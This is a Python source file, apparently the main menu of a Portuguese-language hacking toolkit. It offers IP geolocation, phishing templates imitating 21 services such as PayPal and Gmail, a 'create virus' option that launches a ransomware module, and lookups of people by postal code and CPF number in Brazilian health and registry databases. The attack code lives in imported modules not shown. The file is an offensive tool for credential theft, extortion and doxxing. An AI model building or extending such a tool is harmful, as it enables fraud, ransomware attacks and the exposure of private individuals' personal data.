# bibliotecas
from colorama import Fore
import shutil
import time
import requests
import random
import platform
import keyboard
import webbrowser
from core import doxxing, goldenphish, ser, scanner, ui, rastrear
from malware import ransomware, spyware
from cryptography.fernet import Fernet
import shutil
import json
import sys

def main():
    resposta = int(input('O que deseja?\n⤷ '))

    # Geolocalizar IP
    if resposta == 1:
        while True:
            ui.clear()
            ui.logo()
            ui.title("Geolocalizar IP\n")

            try:
                ip = input(f'{Fore.WHITE}Digite um IP ({Fore.LIGHTBLACK_EX}000.000.000.000{Fore.RESET})\n⤷  ')

                rastrear.Ip(ip)
                
                response = ui.question()
                if response == 1:
                    ui.clear() 
                    continue
                else:
                    ui.clear()
                    break

            except Exception as  ex:
                print(f"{Fore.RED}Error: ({ex})")
                break

        ui.clear()
        return
    
    # Phishing
    elif resposta == 2:
        while True:
            ui.clear()
            ui.logo()
            ui.title("Phishing - Templates\n")

            print("[1] Instagram          [2] Facebook            [3] Snapchat")
            print("[4] Twitter            [5] GitHub              [6] Gmail")
            print("[7] Spotify            [8] Netflix             [9] PayPal")
            print("[10] Microsoft         [11] Steam              [12] Yahoo")
            print("[13] LinkedIn          [14] Protonmail         [15] Wordpress")
            print("[16] Pinterest         [17] Twitch             [18] Discord")
            print("[19] Disney +          [20] Star +             [21] Hbo max")

            templates = {
                '1':'instagram',
                '2': 'facebook',
                '3': 'snapchat',
                '4': 'twitter',
                '5': 'github',
                '6': 'Gmail',
                '7': 'spotify',
                '8': 'netflix',
                '9': 'paypal',
                '10': 'Microsoft',
                '11': 'steam',
                '12': 'yahoo',
                '13': 'linkedin',
                '14': 'protonmail',
                '15': 'wordpress',
                '16': 'Pinterest',
                '17': 'Twitch',
                '18': 'Discord',
                '19': 'Disney +',
                '20': 'Star +',
                '21': 'Hbo max',
                }

            phishing = int(input("Selecione um template\n⤷ "))

            response = ui.question()
            if response == 1:
                ui.clear()
                continue
            else:
                ui.clear()
                break
    
    # Malware
    elif resposta == 3:
        while True:
            ui.clear()
            ui.logo()
            ui.title("Malware\n")

            print(f"""
    {Fore.GREEN}[1]{Fore.WHITE} Ransomware
    {Fore.GREEN}[2]{Fore.WHITE} Spyware
    {Fore.GREEN}[3]{Fore.WHITE} Trojan
    {Fore.BLUE}[0] Voltar{Fore.WHITE}""")
        
            resposta = int(input("Selecione o vírus que deseja criar\n⤷ "))

            if resposta == 1:
                ransomware.ransomware()

                response = ui.question()
                if response == 1:
                    ui.clear()
                    continue
                else:
                    ui.clear()
                    break
            else:
                ui.clear()
                break

    # Rastrear
    elif resposta == 5:
        ui.clear()

        while True:
            ui.clear()
            ui.logo()
            ui.title("Rastrear Alvo\n")

            print(f"""
    {Fore.GREEN}[1]{Fore.WHITE} CEP
    {Fore.GREEN}[2]{Fore.WHITE} CPF
    {Fore.BLUE}[0] Voltar{Fore.WHITE}""")
            response = int(input(f'{Fore.WHITE}Insira a pesquisa que você deseja\n⤷  '))

            # CEP
            if response == 1:
                while True:
                    ui.clear()
                    ui.logo()
                    ui.title("Rastrear Alvo")

                    cep = input(f'{Fore.WHITE}Insira um CEP ({Fore.LIGHTBLACK_EX}01001-000{Fore.RESET})\n⤷  ')
                    validate = rastrear.validate_cep(cep)
                    if validate == False:
                        continue
                    
                    rastrear.cep(cep)

                    response = ui.question()
                    if response == 1:
                        ui.clear()
                        continue
                    else:
                        ui.clear()
                        break;
            
            # CPF
            elif response == 2:
                while True:
                    ui.clear()
                    ui.logo()
                    ui.title("Rastrear Alvo\n")
                    
                    cpf = input(f'{Fore.WHITE}Insira um CPF ({Fore.LIGHTBLACK_EX}000.000.000-00{Fore.RESET})\n⤷  ')
                    
                    validate = rastrear.validate_cpf(cpf)
                    if validate == False:
                        continue
                    
                    print(f"""
    {Fore.GREEN}[1]{Fore.WHITE} CADSUS
    {Fore.GREEN}[2]{Fore.WHITE} SIREGI
    {Fore.BLUE}[0] Voltar{Fore.WHITE}""")
                    
                    base = int(input(f'{Fore.WHITE}\nSelecione a base\n⤷  '))
                    if base == 0:
                        break

                    result = rastrear.cpf(cpf, base)
                    print(result)

                    response = ui.question()
                    if response == 1:
                        ui.clear()
                        continue
                    else:
                        ui.clear()
                        break;

            elif response == 0:
                break
            else:
                print("Opção inválida. Tente novamente.")
        
        ui.clear()
        return
    
    elif resposta == 0:
        sys.exit()
    else:
        ui.clear()
        return

Sair = False
if __name__ == '__main__':
    ui.clear()
    
    while(Sair == False):
        try:
            ui.logo()
            ui.menu()
            main()
        except Exception as ex:
            ui.clear()
            ui.title(f'{Fore.RED}Ocorreu um erro tente novamente!\n{ex}')
            continue